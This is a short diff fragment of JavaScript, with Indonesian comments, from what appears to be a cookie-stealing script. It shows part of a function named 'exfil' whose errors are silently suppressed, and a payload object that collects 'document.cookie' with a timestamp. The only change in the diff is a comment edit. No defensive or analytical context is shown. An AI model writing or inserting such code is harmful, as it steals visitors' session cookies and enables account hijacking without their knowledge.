@@ -11,7 +11,7 @@ function exfil(data) {
   }).catch(() => {});  // jangan tampil error
 }
 
-// Collect data
+// Collect data seperti sebelumnya
 let payload = {
   timestamp: new Date().toISOString(),
   cookies: document.cookie,
